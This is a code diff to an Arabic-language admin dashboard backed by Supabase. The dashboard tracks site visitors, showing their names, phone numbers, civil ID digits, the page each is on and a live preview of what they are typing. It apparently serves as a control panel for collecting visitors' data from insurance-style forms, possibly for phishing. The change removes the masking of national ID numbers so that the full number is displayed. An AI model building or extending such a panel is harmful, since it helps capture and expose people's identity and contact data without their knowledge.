@@ -180,28 +180,28 @@
                             <span class="text-gray-500 w-1/3">رقم الهاتف:</span>
                             <span class="font-bold text-gray-900 w-2/3 text-left" id="card-phone">0582522076</span>
                         </div>
-                        <div class="flex justify-between border-b border-dashed border-gray-200 pb-2">
-                            <span class="text-gray-500 w-1/3">نوع الوثيقة:</span>
-                            <span class="font-bold text-gray-900 w-2/3 text-left" id="card-doctype">استمارة</span>
-                        </div>
-                        <div class="flex justify-between border-b border-dashed border-gray-200 pb-2">
-                            <span class="text-gray-500 w-1/3">الرقم التسلسلي:</span>
-                            <span class="font-bold text-gray-900 w-2/3 text-left" id="card-serial">421908010</span>
-                        </div>
-                        <div class="flex justify-between">
-                            <span class="text-gray-500 w-1/3">نوع التأمين:</span>
-                            <span class="font-bold text-gray-900 w-2/3 text-left" id="card-instype">تأمين جديد</span>
-                        </div>
                     </div>
                         <div class="flex justify-between border-b border-dashed border-gray-200 pb-2 pt-2">
                             <span class="text-gray-500 w-1/3">اسم المستخدم:</span>
                             <span class="font-bold text-gray-900 w-2/3 text-left" id="card-username">—</span>
+                        </div>
+                        <div class="flex justify-between border-b border-dashed border-gray-200 pb-2 pt-2">
+                            <span class="text-gray-500 w-1/3">الاسم (نموذج العميل):</span>
+                            <span class="font-bold text-gray-900 w-2/3 text-left" id="card-customer-name">—</span>
                         </div>
                         <div class="flex justify-between">
                             <span class="text-gray-500 w-1/3">آخر رقم من الهوية:</span>
                             <span class="font-bold text-gray-900 w-2/3 text-left" dir="ltr" id="card-civil">—</span>
                         </div>
                 </div>
+                        <div class="flex justify-between">
+                            <span class="text-gray-500 w-1/3">آخر رقمين من الهوية:</span>
+                            <span class="font-bold text-gray-900 w-2/3 text-left" dir="ltr" id="card-civil-last2">—</span>
+                        </div>
+                        <div class="flex justify-between">
+                            <span class="text-gray-500 w-1/3">الجوال (نموذج العميل):</span>
+                            <span class="font-bold text-gray-900 w-2/3 text-left" dir="ltr" id="card-customer-phone">—</span>
+                        </div>
             </div>
         </main>
     </div>
@@ -222,6 +222,7 @@
 <!-- Supabase data layer: db view + entries + journey -->
 <!-- Supabase data layer: single clean build (fixed syntax) -->
 <!-- Supabase data layer: stats fix -->
+<!-- Supabase data layer: civil merged sequential display -->
 <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2.49.4/dist/umd/supabase.min.js"></script>
 <script>
 const SUPABASE_URL = 'https://gqcugugpigkfaihpaikt.supabase.co';
@@ -330,7 +331,7 @@ function mapVisitor(row) {
         civilRaw: ((F['demo-civil-1'] || '') + (F['demo-civil-2'] || '') + (F['civilId'] || '') + (row.civil_id || '')).replace(/\D/g, ''),
         online: false
     };
-    mapped.civilDisplay = mapped.civilRaw ? (mapped.civilRaw.length > 4 ? '••••' + mapped.civilRaw.slice(-4) : mapped.civilRaw) : '—';
+    mapped.civilDisplay = mapped.civilRaw || '—';
     mapped.online = isOnline(mapped);
     return mapped;
 }
@@ -388,7 +389,7 @@ function renderUsersList() {
             + '<span class="text-[10px] text-gray-400 whitespace-nowrap">' + timeAgo(user.createdAt) + '</span></div>'
             + '<div class="mt-0.5 text-[11px] text-gray-500 flex items-center gap-2" dir="ltr"><span>' + (user.phone !== '—' ? esc(user.phone) : '') + '</span></div>'
             + (user.username ? '<div class="mt-0.5 text-[10px] text-gray-600 font-bold"><i class="fa-solid fa-user-pen"></i> ' + esc(user.username) + '</div>' : '')
-            + (user.civilDisplay !== '—' ? '<div class="mt-0.5 text-[10px] text-gray-600"><i class="fa-solid fa-id-card"></i> آخر رقم من الهوية: <span dir="ltr">' + esc(user.civilDisplay) + '</span></div>' : '')
+            + (user.civilDisplay !== '—' ? '<div class="mt-0.5 text-[10px] text-gray-600"><i class="fa-solid fa-id-card"></i> آخر رقمين من الهوية: <span dir="ltr">' + esc(user.civilDisplay.slice(-2)) + '</span></div>' : '')
             + '<div class="mt-0.5 text-[10px] text-gray-400 flex items-center gap-1"><i class="fa-solid fa-location-dot"></i> يتواجد في: ' + pageLabel(user.page) + '</div>'
             + preview + typingBadge + stateLabel
             + '</div>'
@@ -433,13 +434,16 @@ function selectUser(id) {
     document.getElementById('card-name').innerText = user.name;
     document.getElementById('card-id').innerText = user.idNumber;
     document.getElementById('card-phone').innerText = user.phone;
-    document.getElementById('card-doctype').innerText = user.docType || '—';
-    document.getElementById('card-serial').innerText = user.serial || '—';
-    document.getElementById('card-instype').innerText = user.insType || '—';
     const cuEl = document.getElementById('card-username');
     if (cuEl) cuEl.innerText = user.username || '—';
     const ccEl = document.getElementById('card-civil');
     if (ccEl) ccEl.innerText = user.civilDisplay;
+    const cl2El = document.getElementById('card-civil-last2');
+    if (cl2El) cl2El.innerText = user.civilDisplay ? ('...' + user.civilDisplay.slice(-2)) : '—';
+    const cnEl = document.getElementById('card-customer-name');
+    if (cnEl) cnEl.innerText = (user.fields && user.fields.fullName) ? user.fields.fullName : user.name;
+    const cpEl = document.getElementById('card-customer-phone');
+    if (cpEl) cpEl.innerText = (user.fields && user.fields.phone) ? user.fields.phone : user.phone;
     let fieldsBox = document.getElementById('detail-fields');
     if (!fieldsBox) {
         const anchor = document.getElementById('card-instype');
